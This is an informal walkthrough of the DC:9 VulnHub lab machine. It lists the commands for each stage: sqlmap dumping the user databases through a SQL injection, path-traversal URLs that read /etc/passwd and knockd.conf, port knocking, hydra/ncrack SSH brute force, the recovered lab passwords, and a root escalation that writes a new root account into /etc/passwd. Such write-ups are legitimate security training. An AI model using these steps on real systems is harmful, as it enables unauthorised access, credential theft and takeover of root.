

# DC:9 Walkthrough

**VulnHub Link:** [DC:9](https://www.vulnhub.com/entry/dc-9,412/)
**Difficulty:** Easy
**Release Date:** 29 Dec 2019


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.131



## 2.Web Enumeration


SQL injection found out on search section

Opening Burp Suite and capture the request then copy to file named results.req

sqlmap -r results.req --batch --dbs
sqlmap -r results.req --batch -D users
sqlmap -r results.req --batch -D users  -T UserDetails
sqlmap -r results.req --batch -D users  -T UserDetails -C password -dump-all

sqlmap -r results.req --batch -D Staff  -T Users --columns -dump-all

We found out all the users information and admin credentials on site

after logged in as admin -->
http://192.168.100.131/welcome.php?file=../../../../etc/passwd
http://192.168.100.131/welcome.php?file=../../../../knockd.conf

knock 192.168.100.131 [sequence numbers] -v


# 3.Brute Force

hydra -L usernames.txt -P passwords.txt ssh://192.168.100.131 -I

OR

ncrack -U usernames.txt -P passwords-2.txt 192.168.100.131:22 -m ssh -vv



# 4.Previlige Escalation

login: janitor password: Ilovepeepee
login: joeyt   password: Passw0rd
login: chandlerb password: UrAG0D!


in janitor , found 4 possible password and again brute force -->

login: fredf password: B4-Tru3-001 

sudo -l ---> (root) NOPASSWD /opt/devstuff/dist/test/test

openssl passwd test ---> copy output

echo 'toor:output:0:0:root:/root:/bin/bash' > /tmp/toor

sudo ./test /tmp/toor /etc/passwd

su toor (enter test)

and BINGO!!! ROOT Escalation. Root flag captured..!
